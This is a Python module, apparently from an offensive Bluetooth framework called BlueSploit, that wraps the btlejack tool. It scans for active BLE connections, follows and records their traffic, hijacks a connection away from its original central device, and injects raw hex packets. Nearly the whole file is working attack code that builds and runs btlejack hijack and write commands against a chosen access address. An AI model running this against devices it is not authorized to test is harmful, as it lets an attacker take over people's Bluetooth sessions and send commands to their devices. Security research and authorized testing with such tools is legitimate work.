"""
BTLEJack Connection Following & Injection
Wraps the btlejack tool for BLE connection sniffing, hijacking,
and packet injection using a Micro:Bit or nRF51-based sniffer.

Capabilities:
  - Sniff existing BLE connections without knowing the access address
  - Follow and decode BLE connection traffic
  - Hijack existing connections (take over from original central)
  - Inject raw packets into active BLE connections
"""

import subprocess
import time
import signal
from core.base import AuxiliaryModule, ModuleInfo, ModuleOption, BTProtocol, Severity


class Module(AuxiliaryModule):

    info = ModuleInfo(
        name="BTLEJack Capture",
        description="BTLEJack BLE connection following, hijacking, and injection",
        author="BlueSploit Team",
        protocol=BTProtocol.BLE,
        references=[
            "https://github.com/virtualabs/btlejack",
            "https://www.youtube.com/watch?v=wIGiZKiBmbg",
        ],
        severity=Severity.HIGH,
        cve=None,
    )

    def _setup_options(self):
        self.add_option(ModuleOption(
            name="mode",
            required=False,
            description="Mode: scan, follow, hijack, inject",
            default="scan",
        ))
        self.add_option(ModuleOption(
            name="target",
            required=False,
            description="Target BLE MAC or access address",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="access_address",
            required=False,
            description="BLE connection access address (hex)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Capture duration in seconds",
            default="30",
        ))
        self.add_option(ModuleOption(
            name="pcap_file",
            required=False,
            description="PCAP output file",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="inject_data",
            required=False,
            description="Hex data to inject (for inject mode)",
            default=None,
        ))
        self.add_option(ModuleOption(
            name="channel_map",
            required=False,
            description="Channel map for connection following (hex)",
            default=None,
        ))

    def run(self) -> bool:
        mode = (self.get_option("mode") or "scan").lower()
        target = self.get_option("target")
        access_addr = self.get_option("access_address")
        duration = int(self.get_option("duration") or 30)
        pcap_file = self.get_option("pcap_file")
        inject_data = self.get_option("inject_data")
        channel_map = self.get_option("channel_map")

        valid_modes = ("scan", "follow", "hijack", "inject")
        if mode not in valid_modes:
            self.print_error(f"Invalid mode '{mode}'. Valid: {', '.join(valid_modes)}")
            return False

        if not self._check_btlejack():
            return False

        self.print_status(f"Mode: {mode}")
        self.print_status(f"Duration: {duration}s")

        if mode == "scan":
            return self._scan_connections(duration, pcap_file)
        elif mode == "follow":
            return self._follow_connection(target, access_addr, duration, pcap_file, channel_map)
        elif mode == "hijack":
            return self._hijack_connection(target, access_addr, duration)
        elif mode == "inject":
            return self._inject_packet(target, access_addr, inject_data)

        return False

    def _check_btlejack(self) -> bool:
        """Verify btlejack is installed and device is available"""
        try:
            result = subprocess.run(
                ["btlejack", "--version"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                version = result.stdout.strip() if result.stdout else "unknown"
                self.print_success(f"BTLEJack: {version}")
            else:
                self.print_warning("btlejack returned non-zero, attempting anyway...")
            return True
        except FileNotFoundError:
            self.print_error("btlejack not installed — run: pip install btlejack")
            return False
        except Exception as e:
            self.print_error(f"btlejack check failed: {e}")
            return False

    def _scan_connections(self, duration: int, pcap_file: str) -> bool:
        """Scan for existing BLE connections"""
        self.print_status("Scanning for active BLE connections...")
        self.print_status("This discovers connections by sniffing access addresses on all channels")

        cmd = ["btlejack", "-s"]
        connections_found = []
        packet_count = 0

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            deadline = time.time() + duration
            while time.time() < deadline:
                if proc.poll() is not None:
                    break
                try:
                    line = proc.stdout.readline()
                    if not line:
                        time.sleep(0.1)
                        continue
                    line = line.strip()
                    if not line:
                        continue

                    packet_count += 1
                    self.print_status(f"  {line[:120]}")

                    # Parse access address from btlejack output
                    if "access address" in line.lower() or "0x" in line:
                        connections_found.append(line)
                except Exception:
                    time.sleep(0.1)

            if proc.poll() is None:
                proc.send_signal(signal.SIGINT)
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()

            self.print_status(f"\nScan complete — {packet_count} outputs")
            if connections_found:
                self.print_success(f"Found {len(connections_found)} potential connections:")
                for conn in connections_found[:10]:
                    self.print_success(f"  {conn}")
            else:
                self.print_warning("No active BLE connections found in range")

            return len(connections_found) > 0

        except Exception as e:
            self.print_error(f"Scan error: {e}")
            return False

    def _follow_connection(self, target: str, access_addr: str,
                          duration: int, pcap_file: str, channel_map: str) -> bool:
        """Follow and decode a BLE connection"""
        if not access_addr and not target:
            self.print_error("Need target or access_address for follow mode")
            return False

        if access_addr:
            self.print_status(f"Following connection: access_address=0x{access_addr}")
        else:
            self.print_status(f"Following connections for target: {target}")

        cmd = ["btlejack", "-f"]
        if access_addr:
            cmd.extend(["-a", access_addr])
        if channel_map:
            cmd.extend(["-m", channel_map])
        if pcap_file:
            cmd.extend(["-o", pcap_file])
            self.print_status(f"PCAP output: {pcap_file}")

        return self._run_btlejack(cmd, duration)

    def _hijack_connection(self, target: str, access_addr: str, duration: int) -> bool:
        """Hijack an existing BLE connection"""
        if not access_addr:
            self.print_error("hijack mode requires access_address")
            return False

        self.print_warning(f"Attempting to hijack BLE connection 0x{access_addr}...")
        self.print_warning("This will disconnect the original central device!")

        cmd = ["btlejack", "-f", "-a", access_addr, "--hijack"]
        return self._run_btlejack(cmd, duration)

    def _inject_packet(self, target: str, access_addr: str, inject_data: str) -> bool:
        """Inject a raw packet into a BLE connection"""
        if not access_addr:
            self.print_error("inject mode requires access_address")
            return False
        if not inject_data:
            self.print_error("inject mode requires inject_data (hex)")
            return False

        self.print_status(f"Injecting into connection 0x{access_addr}...")
        self.print_status(f"Data: {inject_data}")

        try:
            data_bytes = bytes.fromhex(inject_data)
        except ValueError:
            self.print_error("inject_data must be valid hex")
            return False

        # btlejack write command after connecting
        cmd = ["btlejack", "-f", "-a", access_addr, "--write", inject_data]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=15
            )
            if result.stdout:
                self.print_status(result.stdout.strip())
            if result.returncode == 0:
                self.print_success(f"Packet injected ({len(data_bytes)} bytes)")
                return True
            else:
                self.print_error(f"Injection failed (exit code {result.returncode})")
                if result.stderr:
                    self.print_warning(result.stderr.strip()[:200])
                return False
        except subprocess.TimeoutExpired:
            self.print_warning("Injection timed out")
            return False
        except Exception as e:
            self.print_error(f"Injection error: {e}")
            return False

    def _run_btlejack(self, cmd: list, duration: int) -> bool:
        """Run a btlejack command with live output and timeout"""
        self.print_status(f"Running: {' '.join(cmd)}")
        packet_count = 0

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            deadline = time.time() + duration
            while time.time() < deadline:
                if proc.poll() is not None:
                    break
                try:
                    line = proc.stdout.readline()
                    if line:
                        line = line.strip()
                        if line:
                            packet_count += 1
                            if packet_count <= 30 or packet_count % 50 == 0:
                                self.print_status(f"  [{packet_count}] {line[:120]}")
                except Exception:
                    time.sleep(0.1)

            if proc.poll() is None:
                proc.send_signal(signal.SIGINT)
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

            self.print_success(f"BTLEJack session complete — {packet_count} lines captured")
            return packet_count > 0

        except Exception as e:
            self.print_error(f"BTLEJack error: {e}")
            return False
